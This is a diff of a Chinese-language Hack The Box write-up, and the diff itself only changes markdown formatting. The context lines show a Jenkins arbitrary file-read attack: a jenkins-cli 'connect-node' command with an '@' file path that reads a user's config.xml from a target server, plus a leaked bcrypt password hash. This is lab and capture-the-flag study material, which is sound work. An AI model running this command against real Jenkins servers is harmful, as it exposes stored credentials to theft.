@@ -63,7 +63,6 @@ ERROR: Error occurred while performing this command, see previous stderr output.
 
 ┌──(kali㉿kali)-[~/htb/docker]
 └─$ sudo docker run -p 8080:8080 --restart=on-failure jenkins/jenkins:lts-jdk17
-
 ```
 
 前往`http://127.0.0.1:8080/`接著`Install suggested Plugins`->`Create First Admin User`
@@ -75,7 +74,7 @@ Full name: admin
 ```
 
 進去`/var/jenkins_home`看看有什麼東西，進去`users`看看，可以看到`users.xml`，裡面有user的資訊
-```
+```xml
 ┌──(kali㉿kali)-[~/htb/docker]
 └─$ sudo docker ps              
 [sudo] password for kali: 
@@ -101,7 +100,7 @@ jenkins@6bd717ec54af:~/users$ cat users.xml
 ```
 
 進到`/users/admin_6654060952648099168`可以看到`config.xml`裡面有密碼
-```
+```xml
 jenkins@6bd717ec54af:~/users/admin_6654060952648099168$ ls
 config.xml
 
@@ -138,7 +137,7 @@ ERROR: Error occurred while performing this command, see previous stderr output.
 ```
 
 然後前往裡面看`config.xml`，得到`$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a`
-```
+```xml
 ┌──(kali㉿kali)-[~/htb]
 └─$ java -jar jenkins-cli.jar -s http://10.129.148.115:8080/ -http connect-node "@/var/jenkins_home/users/jennifer_12108429903186576833/config.xml"
 
